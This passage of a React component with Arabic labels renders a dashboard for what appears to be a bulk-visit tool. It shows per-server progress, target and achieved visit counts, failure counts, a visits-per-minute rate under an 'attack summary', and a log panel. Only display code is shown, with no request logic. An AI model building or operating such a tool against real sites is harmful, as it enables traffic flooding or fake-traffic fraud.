                      <div style={{ height:'100%', borderRadius:'4px', width:`${sv.progress||0}%`, backgroundColor: sv.status === 'finished' ? '#3b82f6' : '#22c55e', transition:'width 0.5s' }}></div>
                    </div>
                    <div style={{ textAlign:'center', fontSize:'11px', color:'#9ca3af', marginTop:'3px' }}>{sv.progress||0}%</div>
                  </>
                )}
                {sv.status === 'offline' && <div style={{ color:'#ef4444', fontSize:'11px' }}>❌ {sv.error || 'غير متصل'}</div>}
              </div>
            ))}

            {/* Totals */}
            {serverStatus.some(x => x.visits > 0) && (
              <div style={{ display:'grid', gridTemplateColumns:'repeat(4, 1fr)', gap:'10px', marginTop:'12px', padding:'10px', backgroundColor:'#111827', borderRadius:'8px', border:'1px solid #166534' }}>
                {[
                  { v: totalVisits.toLocaleString(), l:'إجمالي الزيارات', c:'#22c55e' },
                  { v: totalVisitsEstimate.toLocaleString(), l:'الهدف', c:'#9ca3af' },
                  { v: totalActiveVisitors, l:'نشطين الآن', c:'#06b6d4' },
                  { v: totalErrors, l:'أخطاء', c: totalErrors > 0 ? '#ef4444' : '#22c55e' },
                ].map((x, i) => (
                  <div key={i} style={{ textAlign:'center' }}>
                    <div style={{ fontSize:'22px', fontWeight:'bold', color:x.c }}>{x.v}</div>
                    <div style={{ fontSize:'11px', color:'#9ca3af' }}>{x.l}</div>
                  </div>
                ))}
              </div>
            )}

            {/* Summary */}
            {attackSummary && (
              <div style={{ marginTop:'14px', padding:'16px', backgroundColor:'#0f172a', border:'2px solid #22c55e', borderRadius:'12px', textAlign:'center' }}>
                <div style={{ fontSize:'16px', color:'#22c55e', marginBottom:'12px', fontWeight:'bold' }}>✅ ملخص العملية</div>
                <div style={{ display:'grid', gridTemplateColumns:'repeat(5, 1fr)', gap:'8px' }}>
                  {[
                    { v: attackSummary.target.toLocaleString(), l:'الهدف', c:'#3b82f6' },
                    { v: attackSummary.visits.toLocaleString(), l:'ناجحة', c:'#22c55e' },
                    { v: attackSummary.errors.toLocaleString(), l:'فاشلة', c: attackSummary.errors > 0 ? '#ef4444' : '#22c55e' },
                    { v: formatTime(attackSummary.elapsed), l:'الوقت', c:'#facc15' },
                    { v: attackSummary.rate.toLocaleString(), l:'زيارة/دقيقة', c:'#a855f7' },
                  ].map((x, i) => (
                    <div key={i} style={{ padding:'10px', backgroundColor:'#111827', borderRadius:'8px', border:'1px solid #1f2937' }}>
                      <div style={{ fontSize:'20px', fontWeight:'bold', color:x.c }}>{x.v}</div>
                      <div style={{ fontSize:'10px', color:'#9ca3af', marginTop:'3px' }}>{x.l}</div>
                    </div>
                  ))}
                </div>
                {attackSummary.peakActive > 0 && (
                  <div style={{ marginTop:'8px', fontSize:'12px', color:'#06b6d4' }}>👥 أعلى عدد نشط: {attackSummary.peakActive}</div>
                )}
              </div>
            )}
          </div>
        )}

        {/* Logs */}
        <div style={{ marginTop:'24px' }}>
          <div style={{ display:'flex', justifyContent:'space-between', marginBottom:'6px' }}>
            <span style={{ fontSize:'13px', color:'#9ca3af' }}>💻 سجل النظام</span>
            <button onClick={() => setLogs([])} style={{ fontSize:'11px', color:'#6b7280', cursor:'pointer', background:'none', border:'none', fontFamily:ff }}>مسح</button>
          </div>
          <div style={{ backgroundColor:'#000', border:'1px solid #14532d', height:'180px', overflowY:'auto', padding:'12px', borderRadius:'6px', fontSize:'11px', fontFamily:ff }}>
            {logs.length === 0 ? <span style={{ color:'#4b5563' }}>بانتظار الأوامر...</span> : logs.map((log, i) => (
              <div key={i} style={{ marginBottom:'3px', borderBottom:'1px solid #111827', paddingBottom:'3px' }}>{log}</div>
            ))}
          </div>
        </div>
      </div>
    </div>
  );
}
